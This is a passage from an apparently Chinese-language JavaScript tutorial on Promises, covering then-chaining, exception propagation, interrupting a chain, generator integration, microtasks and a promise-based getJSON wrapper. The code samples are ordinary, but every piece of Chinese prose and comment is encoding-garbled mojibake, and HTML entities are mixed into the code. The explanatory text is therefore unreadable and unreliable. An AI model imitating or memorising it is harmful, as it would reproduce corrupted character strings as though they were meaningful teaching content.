,å˜ä¸º rejected throw 'å‡ºäº†é—®é¢˜'; // 2. è¿”å›ç»“æœæ˜¯é Promise ç±»å‹çš„å¯¹è±¡,æ–° promise å˜ä¸º resolved return 521; // 3. è¿”å›ç»“æœæ˜¯ Promise å¯¹è±¡,æ­¤ promise çš„ç»“æœå°±ä¼šæˆä¸ºæ–° promise çš„ç»“æœ return new Promise((resolve, reject) =&gt; { // resolve('success'); reject('error'); }); &gt;}, reason =&gt; { console.warn(reason); &gt;}); â…¤- promise å¦‚ä½•ä¸²è¿å¤šä¸ªæ“ä½œä»»åŠ¡? (1) promise çš„ then()è¿”å›ä¸€ä¸ªæ–°çš„ promise, å¯ä»¥å¼€æˆ then()çš„é“¾å¼è°ƒç”¨ (2) é€šè¿‡ then çš„é“¾å¼è°ƒç”¨ä¸²è¿å¤šä¸ªåŒæ­¥/å¼‚æ­¥ä»»åŠ¡,è¿™æ ·å°±èƒ½ç”¨then()å°†å¤šä¸ªåŒæ­¥æˆ–å¼‚æ­¥æ“ä½œä¸²è”æˆä¸€ä¸ªåŒæ­¥é˜Ÿåˆ— &gt;&lt;script&gt; &gt;let p = new Promise((resolve, reject) =&gt; { setTimeout(() =&gt; {resolve('OK'); }, 1000); }); &gt;p.then(value =&gt; {return new Promise((resolve, reject) =&gt; { resolve(\"success\"); });}) &gt;.then(value =&gt; {console.log(value);}) &gt;.then(value =&gt; { console.log(value);}) &gt;&lt;/script&gt; â…¥-promise å¼‚å¸¸ä¼ é€? å½“ä½¿ç”¨ promise çš„ then é“¾å¼è°ƒç”¨æ—¶, å¯ä»¥åœ¨æœ€åæŒ‡å®šå¤±è´¥çš„å›è°ƒ å‰é¢ä»»ä½•æ“ä½œå‡ºäº†å¼‚å¸¸, éƒ½ä¼šä¼ åˆ°æœ€åå¤±è´¥çš„å›è°ƒä¸­å¤„ç† &gt;getJSON('./hong.json') .then(function(posts) { throw new Error('æŠ›å‡ºå¼‚å¸¸') }) .then(res=&gt;console.log(res),e=&gt;console.log('è¢«thençš„é”™è¯¯å›è°ƒæ•è·',e) ) .catch(function(error) { // å¤„ç† getJSON å’Œ å‰ä¸€ä¸ªå›è°ƒå‡½æ•°è¿è¡Œæ—¶å‘ç”Ÿçš„é”™è¯¯ console.log('é”™è¯¯æ•è·: ', error); }); &gt;//æ‰§è¡Œç»“æœ: è¢«thençš„é”™è¯¯å›è°ƒæ•è· Error: æŠ›å‡ºå¼‚å¸¸ &gt;/******************** åˆ©ç”¨å¼‚å¸¸ç©¿é€ ****************************************/ &gt;getJSON('./hong.json') .then(function(posts) { throw new Error('æŠ›å‡ºå¼‚å¸¸') }) .then(res=&gt;console.log(res) ) //æ­¤å¤„å·®å¼‚,ä¸æŒ‡å®š reject å›è°ƒ,åˆ©ç”¨å¼‚å¸¸ç©¿é€ä¼ åˆ°æœ€å .catch(function(error) { console.log('é”™è¯¯æ•è·: ', error); }); &gt;//æ‰§è¡Œç»“æœ: é”™è¯¯æ•è·: Error: æŠ›å‡ºå¼‚å¸¸ æ³¨:å¯ä»¥åœ¨æ¯ä¸ªthen()çš„ç¬¬äºŒä¸ªå›è°ƒå‡½æ•°ä¸­è¿›è¡Œerrå¤„ç†,ä¹Ÿå¯ä»¥åˆ©ç”¨å¼‚å¸¸ç©¿é€ç‰¹æ€§,åˆ°æœ€åç”¨catchå»æ‰¿æ¥ç»Ÿä¸€å¤„ç†,ä¸¤è€…ä¸€èµ·ç”¨æ—¶,å‰è€…ä¼šç”Ÿæ•ˆ(å› ä¸ºerrå·²ç»å°†å…¶å¤„ç†,å°±ä¸ä¼šå†å¾€ä¸‹ç©¿é€)è€Œèµ°ä¸åˆ°åé¢çš„catch â…¦- ä¸­æ–­ promise é“¾? åœ¨å…³é”®é—®é¢˜2ä¸­,å¯ä»¥å¾—çŸ¥,å½“promiseçŠ¶æ€æ”¹å˜æ—¶,ä»–çš„é“¾å¼è°ƒç”¨éƒ½ä¼šç”Ÿæ•ˆ,é‚£å¦‚æœæˆ‘ä»¬æœ‰è¿™ä¸ªä¸€ä¸ªå®é™…éœ€æ±‚:æˆ‘ä»¬æœ‰5ä¸ªthen(),ä½†å…¶ä¸­æœ‰æ¡ä»¶åˆ¤æ–­,å¦‚å½“æˆ‘ç¬¦åˆæˆ–è€…ä¸ç¬¦åˆç¬¬ä¸‰ä¸ªthenæ¡ä»¶æ—¶,è¦ç›´æ¥ä¸­æ–­é“¾å¼è°ƒç”¨,ä¸å†èµ°ä¸‹é¢çš„then,è¯¥å¦‚ä½•? (1) å½“ä½¿ç”¨ promise çš„ then é“¾å¼è°ƒç”¨æ—¶, åœ¨ä¸­é—´ä¸­æ–­, ä¸å†è°ƒç”¨åé¢çš„å›è°ƒå‡½æ•° (2) åŠæ³•: åœ¨å›è°ƒå‡½æ•°ä¸­è¿”å›ä¸€ä¸ª pendding çŠ¶æ€çš„promise å¯¹è±¡ &gt;&lt;script&gt; &gt;let p = new Promise((resolve, reject) =&gt; {setTimeout(() =&gt; { resolve('OK');}, 1000);}); &gt;p.then(value =&gt; {return new Promise(() =&gt; {});})//æœ‰ä¸”åªæœ‰è¿™ä¸€ä¸ªæ–¹å¼ &gt;.then(value =&gt; { console.log(222);}) &gt;.then(value =&gt; { console.log(333);}) &gt;.catch(reason =&gt; {console.warn(reason);}); &gt;&lt;/script&gt; 5ã€ Promiseçš„å®é™…åº”ç”¨ ä¸¾ä¸¤ä¸ªæ —å­ â…  - åŠ è½½å›¾ç‰‡ æˆ‘ä»¬å¯ä»¥å°†å›¾ç‰‡çš„åŠ è½½å†™æˆä¸€ä¸ªPromiseï¼Œä¸€æ—¦åŠ è½½å®Œæˆï¼ŒPromiseçš„çŠ¶æ€å°±å‘ç”Ÿå˜åŒ–ã€‚ &gt;const preloadImage = function (path) { return new Promise(function (resolve, reject) { const image = new Image(); image.onload = resolve; image.onerror = reject; image.src = path; }); &gt;}; â…¡ - Generator å‡½æ•°ä¸ Promise çš„ç»“åˆ ä½¿ç”¨ Generator å‡½æ•°ç®¡ç†æµç¨‹ï¼Œé‡åˆ°å¼‚æ­¥æ“ä½œçš„æ—¶å€™ï¼Œé€šå¸¸è¿”å›ä¸€ä¸ªPromiseå¯¹è±¡ã€‚ &gt;function getFoo () { return new Promise(function (resolve, reject){ resolve('foo'); }); &gt;} &gt;const g = function* () { try { const foo = yield getFoo(); console.log(foo); } catch (e) { console.log(e); } &gt;}; &gt;function run (generator) { const it = generator(); function go(result) { if (result.done) return result.value; return result.value.then(function (value) { return go(it.next(value)); }, function (error) { return go(it.throw(error)); }); } go(it.next()); &gt;} &gt;run(g); ä¸Šé¢ä»£ç çš„ Generator å‡½æ•°gä¹‹ä¸­ï¼Œæœ‰ä¸€ä¸ªå¼‚æ­¥æ“ä½œgetFooï¼Œå®ƒè¿”å›çš„å°±æ˜¯ä¸€ä¸ªPromiseå¯¹è±¡ã€‚å‡½æ•°runç”¨æ¥å¤„ç†è¿™ä¸ªPromiseå¯¹è±¡ï¼Œå¹¶è°ƒç”¨ä¸‹ä¸€ä¸ªnextæ–¹æ³•ã€‚ äºŒã€Promise API ç”¨æ³•è¯¦è§£ ES6 è§„å®šï¼ŒPromiseå¯¹è±¡æ˜¯ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œç”¨æ¥ç”ŸæˆPromiseå®ä¾‹ã€‚ æ­¤éƒ¨åˆ†æ˜¯å¯¹äº Promise API ç”¨æ³•çš„è¯¦è§£ ,å°½é‡è¯¦ç»†åœ°åˆ—ä¸¾å…¶å¸¸è§ç”¨æ³•,æ‰€ä»¥ç¯‡å¹…è¾ƒé•¿ â…  - åŸºæœ¬ç”¨æ³•â‘  ä¸¾ä¸ªåˆ›é€  Promise å®ä¾‹çš„æ —å­ ä¸‹é¢ä»£ç åˆ›é€ äº†ä¸€ä¸ªPromiseå®ä¾‹ã€‚ const promise = new Promise(function(resolve, reject) { if (/* å¼‚æ­¥æ“ä½œæˆåŠŸ */) resolve(value); //å°†è¯¥ Promise ä¿®æ”¹ä¸ºæˆåŠŸä¸”è¿”å› else reject(error); //å°†è¯¥ Promise ä¿®æ”¹ä¸ºå¤±è´¥ä¸”è¿”å› }); Promiseæ„é€ å‡½æ•°æ¥å—ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°ï¼Œè¯¥å‡½æ•°çš„ä¸¤ä¸ªå‚æ•°åˆ†åˆ«æ˜¯resolveå’Œrejectã€‚å®ƒä»¬æ˜¯ä¸¤ä¸ªå‡½æ•°ï¼Œç”± JavaScript å¼•æ“æä¾›ï¼Œä¸ç”¨è‡ªå·±éƒ¨ç½²ã€‚ resolveå‡½æ•°çš„ä½œç”¨æ˜¯ï¼Œå°†Promiseå¯¹è±¡çš„çŠ¶æ€ä»â€œæœªå®Œæˆâ€å˜ä¸ºâ€œæˆåŠŸâ€ï¼ˆå³ä» pending å˜ä¸º resolvedï¼‰ï¼Œåœ¨å¼‚æ­¥æ“ä½œæˆåŠŸæ—¶è°ƒç”¨ï¼Œå¹¶å°†å¼‚æ­¥æ“ä½œçš„ç»“æœï¼Œä½œä¸ºå‚æ•°ä¼ é€’å‡ºå»ï¼›rejectå‡½æ•°çš„ä½œç”¨æ˜¯ï¼Œå°†Promiseå¯¹è±¡çš„çŠ¶æ€ä»â€œæœªå®Œæˆâ€å˜ä¸ºâ€œå¤±è´¥â€ï¼ˆå³ä» pending å˜ä¸º rejectedï¼‰ï¼Œåœ¨å¼‚æ­¥æ“ä½œå¤±è´¥æ—¶è°ƒç”¨ï¼Œå¹¶å°†å¼‚æ­¥æ“ä½œæŠ¥å‡ºçš„é”™è¯¯ï¼Œä½œä¸ºå‚æ•°ä¼ é€’å‡ºå»ã€‚ â‘¡ ä½¿ç”¨ [ then ] æ–¹æ³•åˆ†åˆ«æŒ‡å®š æˆåŠŸ/å¤±è´¥ çš„å›è°ƒ Promiseå®ä¾‹ç”Ÿæˆä»¥åï¼Œå¯ä»¥ç”¨ [ then() ] æ–¹æ³•åˆ†åˆ«æŒ‡å®šresolvedçŠ¶æ€å’ŒrejectedçŠ¶æ€çš„å›è°ƒå‡½æ•°ã€‚ &gt;promise.then(function(value) { &gt;// å½“promiseçŠ¶æ€è¿”å›ä¸ºresolve æ—¶ä¼šæ‰§è¡Œçš„å›è°ƒå‡½æ•° &gt;}, function(error) { &gt;// å½“promiseçŠ¶æ€è¿”å›ä¸ºrejected æ—¶ä¼šæ‰§è¡Œçš„å›è°ƒå‡½æ•° &gt;}); [ then ] æ–¹æ³•å¯ä»¥æ¥å—ä¸¤ä¸ªå›è°ƒå‡½æ•°ä½œä¸ºå‚æ•°ã€‚ç¬¬ä¸€ä¸ªå›è°ƒå‡½æ•°æ˜¯Promiseå¯¹è±¡çš„çŠ¶æ€å˜ä¸ºresolvedæ—¶è°ƒç”¨ï¼Œç¬¬äºŒä¸ªå›è°ƒå‡½æ•°æ˜¯Promiseå¯¹è±¡çš„çŠ¶æ€å˜ä¸ºrejectedæ—¶è°ƒç”¨ã€‚å…¶ä¸­ï¼Œç¬¬äºŒä¸ªå‡½æ•°æ˜¯å¯é€‰çš„ï¼Œä¸ä¸€å®šè¦æä¾›ã€‚è¿™ä¸¤ä¸ªå‡½æ•°éƒ½æ¥å—Promiseå¯¹è±¡ä¼ å‡ºçš„å€¼ä½œä¸ºå‚æ•°ã€‚ â‘¢ ä¸¾ä¸ª Promise å¯¹è±¡çš„ç®€å•æ —å­ ä¸‹é¢æ˜¯ä¸€ä¸ªPromiseå¯¹è±¡çš„ç®€å•ä¾‹å­ã€‚ setTimeoutçš„ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ç»™ç¬¬ä¸€ä¸ªå‡½æ•°çš„å‚æ•°ï¼Œè€Œä¸”æ˜¯å…ˆäºç¬¬ä¸€ä¸ªå‚æ•°(å³å›è°ƒå‡½æ•°)æ‰§è¡Œçš„ &gt;function timeout(ms) { //å£°æ˜ä¸€ä¸ªæ–¹æ³•, ä¼ å…¥çš„ å‚æ•°ms ä¸ºå»¶æ—¶å™¨æ—¶é—´ return new Promise((resolve, reject) =&gt; { //è¿™è¡Œä»£ç å®é™…æ•ˆæœ: å½“ [ms] æ¯«ç§’å æ‰§è¡Œ resolve('åŠªåŠ›å­¦ä¹ çš„æ±ª') setTimeout(resolve, ms, 'åŠªåŠ›å­¦ä¹ çš„æ±ª'); }); &gt;} &gt;timeout(1000).then((value) =&gt; { console.log(value) }); &gt;//æ‰“å°ç»“æœ : åŠªåŠ›å­¦ä¹ çš„æ±ª ä¸Šé¢ä»£ç ä¸­ï¼Œtimeoutæ–¹æ³•è¿”å›ä¸€ä¸ªPromiseå®ä¾‹ï¼Œè¡¨ç¤ºä¸€æ®µæ—¶é—´ä»¥åæ‰ä¼šå‘ç”Ÿçš„ç»“æœã€‚è¿‡äº†æŒ‡å®šçš„æ—¶é—´ï¼ˆmså‚æ•°ï¼‰ä»¥åï¼ŒPromiseå®ä¾‹çš„çŠ¶æ€å˜ä¸ºresolvedï¼Œå°±ä¼šè§¦å‘thenæ–¹æ³•ç»‘å®šçš„å›è°ƒå‡½æ•°ã€‚ â‘£ Promise æ–°å»ºåå°±ä¼šç«‹å³æ‰§è¡Œ &gt;let promise = new Promise(function(resolve, reject) { &gt;console.log('Promise'); &gt;resolve(); &gt;}); &gt;promise.then(function() { &gt;console.log('resolved.'); &gt;}); &gt;console.log('Hi!'); &gt;// Promise &gt;// Hi! &gt;// resolved //å¯ä»¥å‘ç°,æ˜æ˜thenæ˜¯åœ¨ Hi å‰é¢,å´æœ€åæ‰“å° ä¸Šé¢ä»£ç ä¸­ï¼ŒPromise æ–°å»ºåç«‹å³æ‰§è¡Œï¼Œæ‰€ä»¥é¦–å…ˆè¾“å‡ºçš„æ˜¯Promiseã€‚ç„¶åï¼Œthenæ–¹æ³•æŒ‡å®šçš„å›è°ƒå‡½æ•°ï¼Œå°†åœ¨å½“å‰è„šæœ¬æ‰€æœ‰åŒæ­¥ä»»åŠ¡æ‰§è¡Œå®Œæ‰ä¼šæ‰§è¡Œï¼Œæ‰€ä»¥resolvedæœ€åè¾“å‡ºã€‚ å®é™…ä¸Š,è¿™ä¸ªè¿è¡Œç»“æœç›¸å…³çŸ¥è¯†ç‚¹æ˜¯ [ å®ä»»åŠ¡ä¸å¾®ä»»åŠ¡ ] ,å•ç‹¬æ¢³ç†åœ¨ä¸‹æ–¹.è¿™é‡Œå¯ä»¥å…ˆåˆæ­¥ç†è§£ä¸º: JSæ˜¯å•çº¿ç¨‹çš„,è‡³ä¸Šå¾€ä¸‹è¿è¡Œ,åœ¨å£°æ˜ Promise æ—¶å®é™…ä¸Šå·²ç»æ‰§è¡Œåˆ°äº†å†…éƒ¨æ–¹æ³• ä¸ºä½• resolve() è¿è¡Œåæ²¡æœ‰ç«‹å³æ‰“å°? JSä¸­ç”¨æ¥å­˜å‚¨å¾…æ‰§è¡Œå›è°ƒå‡½æ•°çš„é˜Ÿåˆ—åŒ…å«2ä¸ªä¸åŒç‰¹å®šçš„åˆ—é˜Ÿ å®é˜Ÿåˆ—:ç”¨æ¥ä¿å­˜å¾…æ‰§è¡Œçš„å®ä»»åŠ¡(å›è°ƒ),æ¯”å¦‚:å®šæ—¶å™¨å›è°ƒ/ajaxå›è°ƒ/domäº‹ä»¶å›è°ƒ å¾®é˜Ÿåˆ—:ç”¨æ¥ä¿å­˜å¾…æ‰§è¡Œçš„å¾®ä»»åŠ¡(å›è°ƒ),æ¯”å¦‚:Promiseçš„å›è°ƒ/muntationå›è°ƒ JSæ‰§è¡Œæ—¶ä¼šåŒºåˆ«è¿™2ä¸ªé˜Ÿåˆ—: JSæ‰§è¡Œå¼•æ“é¦–å…ˆå¿…é¡»æ‰§è¡Œæ‰€æœ‰çš„åˆå§‹åŒ–åŒæ­¥ä»»åŠ¡ä»£ç  æ¯æ¬¡å‡†å¤‡å–å‡ºç¬¬ä¸€ä¸ªå®ä»»åŠ¡æ‰§è¡Œå‰,éƒ½è¦å°†æ‰€æœ‰çš„å¾®ä»»åŠ¡ä¸€ä¸ªä¸€ä¸ªå–å‡ºæ¥æ‰§è¡Œ â‘¤ ä¸¾ä¸ªå¼‚æ­¥åŠ è½½å›¾ç‰‡çš„æ —å­ &gt;function loadImageAsync(url) { &gt;return new Promise(function(resolve, reject) { &gt;const image = new Image(); &gt;image.onload = function() { console.log('å›¾ç‰‡åŠ è½½æˆåŠŸ') resolve(image); &gt;}; &gt;image.onerror = function() { reject(new Error(`æ— æ³•ä» ${url} ä¸­åŠ è½½å›¾ç‰‡` )); &gt;}; &gt;image.src = url; &gt;}); &gt;} &gt;loadImageAsync('æ­£ç¡®çš„url') //æ‰“å°å›¾ç‰‡åŠ è½½æˆåŠŸ &gt;loadImageAsync('é”™è¯¯çš„url') //æŠ›å‡ºå¼‚å¸¸ ä¸Šé¢ä»£ç ä¸­ï¼Œä½¿ç”¨PromiseåŒ…è£…äº†ä¸€ä¸ªå›¾ç‰‡åŠ è½½çš„å¼‚æ­¥æ“ä½œã€‚å¦‚æœåŠ è½½æˆåŠŸï¼Œå°±è°ƒç”¨resolveæ–¹æ³•ï¼Œå¦åˆ™å°±è°ƒç”¨rejectæ–¹æ³•ã€‚ â‘¥ ä¸¾ä¸ªç”¨Promiseå¯¹è±¡å®ç°çš„ Ajax æ“ä½œçš„æ —å­ AjaxçŸ¥è¯†ç‚¹ä¸æ‡‚çš„åŒå­¦è¦å»è¡¥ä¸€ä¸‹: è¿™é‡Œå¯ä»¥çœ‹æœ¬äººæ¢³ç†çš„ajaxç¬”è®° â€“&gt; ç‚¹æˆ‘è·³è½¬ &gt;const getJSON = function(url) { &gt;const promise = new Promise(function(resolve, reject){ &gt;const handler = function() { if (this.readyState !== 4) return; //å½“readyState ä¸º4 æ—¶ç›´æ¥è¿”å›,ä¸ä¿®æ”¹ promise çŠ¶æ€ if (this.status === 200) resolve(this.response); //è¿”å›çŠ¶æ€ä¸º 200 æ—¶å°†çŠ¶æ€ä¿®æ”¹ä¸ºæˆåŠŸ,ä¸”å°†å“åº”å†…å®¹è¿”å› else reject(new Error(this.statusText)); //å¤±è´¥æ—¶æŠ›å‡ºå¼‚å¸¸ &gt;}; &gt;const client = new XMLHttpRequest(); //å®ä¾‹åŒ–xmlå®ä¾‹ &gt;client.open(\"GET\", url); //ä¸‹é¢è¿™å‡ è¡Œéƒ½æ˜¯å¯¹xmlå®ä¾‹è¿›è¡Œé…ç½®,ä¸æ‡‚çš„åŒå­¦è¦å»è¡¥ä¸€ä¸‹ajaxçŸ¥è¯†ç‚¹ &gt;client.onreadystatechange = handler; &gt;client.responseType = \"json\"; &gt;client.setRequestHeader(\"Accept\", \"application/json\"); &gt;client.send(); &gt;}); &gt;return promise; &gt;}; &gt;getJSON(\"./hong.json\").then(function(json) { &gt;console.log('Contents: ' , json); &gt;}, function(error) { &gt;console.error('å‡ºé”™äº†', error); &gt;}); ä¸Šé¢ä»£ç ä¸­ï¼ŒgetJSONæ˜¯å¯¹ XMLHttpRequest å¯¹è±¡çš„å°è£…ï¼Œç”¨äºå‘å‡ºä¸€ä¸ªé’ˆå¯¹ JSON æ•°æ®çš„ HTTP è¯·æ±‚ï¼Œå¹¶ä¸”è¿”å›ä¸€ä¸ªPromiseå¯¹è±¡ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨getJSONå†…éƒ¨ï¼Œresolveå‡½æ•°å’Œrejectå‡½æ•°è°ƒç”¨æ—¶ï¼Œéƒ½å¸¦æœ‰å‚æ•°ã€‚ å°è´´å£«:æ­¤å¤„å¯èƒ½æœ‰åŒå­¦æƒ³å°è¯•å´å‘ç°è¯»å–æœ¬åœ°æ–‡ä»¶ä¼šæœ‰è·¨åŸŸé—®é¢˜,è¿™è¾¹æ•™ä¸€ä¸‹ä½ ä»¬ â‘¦ resolve() çš„å‚æ•°å¯ä»¥æ˜¯å¦ä¸€ä¸ª Promise å®ä¾‹ å¦‚æœè°ƒç”¨resolveå‡½æ•°å’Œrejectå‡½æ•°æ—¶å¸¦æœ‰å‚æ•°ï¼Œé‚£ä¹ˆå®ƒä»¬çš„å‚æ•°ä¼šè¢«ä¼ é€’ç»™å›è°ƒå‡½æ•°ã€‚rejectå‡½æ•°çš„å‚æ•°é€šå¸¸æ˜¯Errorå¯¹è±¡çš„å®ä¾‹ï¼Œè¡¨ç¤ºæŠ›å‡ºçš„é”™è¯¯ï¼›resolveå‡½æ•°çš„å‚æ•°é™¤äº†æ­£å¸¸çš„å€¼ä»¥å¤–ï¼Œè¿˜å¯èƒ½æ˜¯å¦ä¸€ä¸ª Promise å®ä¾‹ï¼Œæ¯”å¦‚åƒä¸‹é¢è¿™æ ·ã€‚ &gt;const p1 = new Promise(function (resolve, reject) {}); &gt;const p2 = new Promise(function (resolve, reject) { resolve(p1) }) ä¸Šé¢ä»£ç ä¸­ï¼Œp1å’Œp2éƒ½æ˜¯ Promise çš„å®ä¾‹ï¼Œä½†æ˜¯p2çš„resolveæ–¹æ³•å°†p1ä½œä¸ºå‚æ•°ï¼Œå³ä¸€ä¸ªå¼‚æ­¥æ“ä½œçš„ç»“æœæ˜¯è¿”å›å¦ä¸€ä¸ªå¼‚æ­¥æ“ä½œã€‚ æ³¨æ„ï¼Œè¿™æ—¶p1çš„çŠ¶æ€å°±ä¼šä¼ é€’ç»™p2ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œp1çš„çŠ¶æ€å†³å®šäº†p2çš„çŠ¶æ€ã€‚å¦‚æœp1çš„çŠ¶æ€æ˜¯pendingï¼Œé‚£ä¹ˆp2çš„å›è°ƒå‡½æ•°å°±ä¼šç­‰å¾…p1çš„çŠ¶æ€æ”¹å˜ï¼›å¦‚æœp1çš„çŠ¶æ€å·²ç»æ˜¯resolvedæˆ–è€…rejectedï¼Œé‚£ä¹ˆp2çš„å›è°ƒå‡½æ•°å°†ä¼šç«‹åˆ»æ‰§è¡Œã€‚ &gt;const p1 = new Promise(function (resolve, reject) { &gt;setTimeout(() =&gt; reject(new Error('p1çš„çŠ¶æ€æ”¹ä¸ºé”™è¯¯')), 0) &gt;}) &gt;const p2 = new Promise(function (resolve, reject) { &gt;setTimeout(() =&gt; resolve(p1), 3000) //å°†p1 ä¼ ç»™p2 &gt;}) &gt;p2.then(result =&gt; console.log(result),result=&gt;console.log('å¤±è´¥')) &gt;.catch(error =&gt; console.log('catchå¼‚å¸¸æ•è·:'+error)) &gt;//é¦–å…ˆæŠ¥é”™ &gt;//è¿è¡Œä¸‰ç§’åæ‰“å°: å¤±è´¥ ä¸Šé¢ä»£ç è¿è¡Œåæ‰§è¡Œæ•ˆæœ: é¦–å…ˆé©¬ä¸Šä¼šæ‰“å°ä¸€ä¸ªæŠ¥é”™ : â€œUncaught (in promise) Error: p1çš„çŠ¶æ€æ”¹ä¸ºé”™è¯¯â€ (çº¢è‰²æŠ¥é”™) ç„¶åç­‰3ç§’åå†æ‰“å°: â€˜å¤±è´¥â€™ æ³¨æ„: å¦‚æœ p2.then() ä¸­æ²¡æœ‰å†™ reject å›è°ƒå‡½æ•°(ç¬¬äºŒä¸ªå‚æ•°),åˆ™ä¼šè¢« catch æ•è·,å˜ä¸ºcatchå¼‚å¸¸æ•è·:Error: p1çš„çŠ¶æ€æ”¹ä¸ºé”™è¯¯ è§£é‡Š: é¦–å…ˆå‰é¢è¯´è¿‡,promiseå®šä¹‰æ—¶å°±ä¼šç«‹å³æ‰§è¡Œ,æ‰€ä»¥åˆšå¼€å§‹å°±è¿è¡Œäº† p1 çš„reject(),æ‰€ä»¥ç›´æ¥æ§åˆ¶å°æŠ¥é”™äº† resolveæ–¹æ³•è¿”å›çš„æ˜¯p1ã€‚ç”±äºp2è¿”å›çš„æ˜¯å¦ä¸€ä¸ª Promiseï¼Œå¯¼è‡´p2è‡ªå·±çš„çŠ¶æ€æ— æ•ˆäº†ï¼Œç”±p1çš„çŠ¶æ€å†³å®šp2çš„çŠ¶æ€ æ€»ç»“æ¥è¯´,promiseè¿”å›promiseè¿™ç§åµŒå¥—å½¢å¼,å°†ç”±æœ€å†…å±‚çš„promiseå†³å®šå¤–å±‚çš„çŠ¶æ€ â‘§ è°ƒç”¨resolveæˆ–rejectå¹¶ä¸ä¼šç»ˆç»“ Promise çš„å‚æ•°å‡½æ•°çš„æ‰§è¡Œ è°ƒç”¨resolveæˆ–rejectå¹¶ä¸ä¼šç»ˆç»“ Promise çš„å‚æ•°å‡½æ•°çš„æ‰§è¡Œã€‚ &gt;new Promise((resolve, reject) =&gt; { &gt;resolve(1); &gt;console.log(2); &gt;}).then(r =&gt; { &gt;console.log(r); &gt;}); &gt;// 2 &gt;// 1 ä¸Šé¢ä»£ç ä¸­ï¼Œè°ƒç”¨resolve(1)ä»¥åï¼Œåé¢çš„console.log(2)è¿˜æ˜¯ä¼šæ‰§è¡Œï¼Œå¹¶ä¸”ä¼šé¦–å…ˆæ‰“å°å‡ºæ¥ã€‚è¿™æ˜¯å› ä¸ºç«‹å³ resolved çš„ Promise æ˜¯åœ¨æœ¬è½®äº‹ä»¶å¾ªç¯çš„æœ«å°¾æ‰§è¡Œï¼Œæ€»æ˜¯æ™šäºæœ¬è½®å¾ªç¯çš„åŒæ­¥ä»»åŠ¡ã€‚ â‘¨ å»ºè®®åœ¨ä¿®æ”¹çŠ¶æ€å‡½æ•°å‰åŠ return ä¸€èˆ¬æ¥è¯´ï¼Œè°ƒç”¨resolveæˆ–rejectä»¥åï¼ŒPromise çš„ä½¿å‘½å°±å®Œæˆäº†ï¼Œåç»§æ“ä½œåº”è¯¥æ”¾åˆ°thenæ–¹æ³•é‡Œé¢ï¼Œè€Œä¸åº”è¯¥ç›´æ¥å†™åœ¨resolveæˆ–rejectçš„åé¢ã€‚æ‰€ä»¥ï¼Œæœ€å¥½åœ¨å®ƒä»¬å‰é¢åŠ ä¸Šreturnè¯­å¥ï¼Œè¿™æ ·å°±ä¸ä¼šæœ‰æ„å¤–ã€‚ &gt;new Promise((resolve, reject) =&gt; { &gt;return resolve(1); &gt;// åé¢çš„è¯­å¥ä¸ä¼šæ‰§è¡Œ &gt;console.log(2); &gt;}) æœ‰åŒå­¦å¯èƒ½å°±ä¼šé—®äº†,ä¸åŠ æ„Ÿè§‰ä¹Ÿæ²¡å•¥äº‹å•Š,åæ­£æˆ‘åœ¨è¿™ä¸ªå‡½æ•°ä½“å†…å°±æ˜¯è¦åšè¿™äº›æ“ä½œ,æ”¾åœ¨ resolve/rejectå‰åå¥½åƒéƒ½ä¸å½±å“å•Š! è¿™é‡Œæˆ‘ç»™ä¸¾ä¸ªå®é™…åœºæ™¯ a) ä¸åŠ  return å¯¼è‡´çš„é”™è¯¯åœºæ™¯ä¸¾ğŸŒ° ä¸€èˆ¬æ¥è¯´,é”™è¯¯å‘ç”Ÿåœ¨ Promise å†…,æ˜¯ä¸ä¼šä¼ åˆ°å¤–éƒ¨çš„,åªä¼šåœ¨ Promise å†…éƒ¨æ¶ˆåŒ–,è¯¦è§ä¸‹æ–¹APIè¯¦è§£éƒ¨åˆ†çš„ [â‘¡Promise.prototype.catch()](#â‘¡ Promise.prototype.catch()) &gt;const promise = new Promise(function (resolve, reject) { &gt;resolve('æˆåŠŸäº†'); //å¦‚æœä½ åŠ äº† return , å‡½æ•°æ‰§è¡Œåˆ°æ­¤æ­¥å°±åœæ­¢äº† &gt;setTimeout(function () { throw new Error('é”™è¯¯é”™è¯¯!!!!!') }, 0) &gt;}); &gt;promise.then(function (value) { console.log(value) }); &gt;// ok &gt;// Uncaught Error: é”™è¯¯é”™è¯¯!!!! ä¸Šé¢ä»£ç ä¸­ï¼ŒPromise æŒ‡å®šåœ¨ä¸‹ä¸€è½®â€œäº‹ä»¶å¾ªç¯â€å†æŠ›å‡ºé”™è¯¯ã€‚åˆ°äº†é‚£ä¸ªæ—¶å€™ï¼ŒPromise çš„è¿è¡Œå·²ç»ç»“æŸäº†ï¼Œæ‰€ä»¥è¿™ä¸ªé”™è¯¯æ˜¯åœ¨ Promise å‡½æ•°ä½“å¤–æŠ›å‡ºçš„ï¼Œä¼šå†’æ³¡åˆ°æœ€å¤–å±‚ï¼Œæˆäº†æœªæ•è·çš„é”™è¯¯ã€‚ â…¡ - API ç”¨æ³•è¯¦è§£ æ­¤å¤„å°†å¯¹äºæ‰€æœ‰APIè¿›è¡Œè¯¦ç»†å‰–æ,å‚ç…§èµ„æ–™ä¸º é˜®ä¸€å³°çš„ES6æ—¥å¿— â‘  Promise.prototype.then() Promise å®ä¾‹å…·æœ‰thenæ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œthenæ–¹æ³•æ˜¯å®šä¹‰åœ¨åŸå‹å¯¹è±¡Promise.prototypeä¸Šçš„ã€‚å®ƒçš„ä½œç”¨æ˜¯ä¸º Promise å®ä¾‹æ·»åŠ çŠ¶æ€æ”¹å˜æ—¶çš„å›è°ƒå‡½æ•°ã€‚å‰é¢è¯´è¿‡ï¼Œthenæ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯resolvedçŠ¶æ€çš„å›è°ƒå‡½æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°ï¼ˆå¯é€‰ï¼‰æ˜¯rejectedçŠ¶æ€çš„å›è°ƒå‡½æ•°ã€‚ a) thenæ–¹æ³•è¿”å›çš„æ˜¯ä¸€ä¸ªæ–°çš„Promiseå®ä¾‹ thenæ–¹æ³•è¿”å›çš„æ˜¯ä¸€ä¸ªæ–°çš„Promiseå®ä¾‹ï¼ˆæ³¨æ„ï¼Œä¸æ˜¯åŸæ¥é‚£ä¸ªPromiseå®ä¾‹ï¼‰ã€‚å› 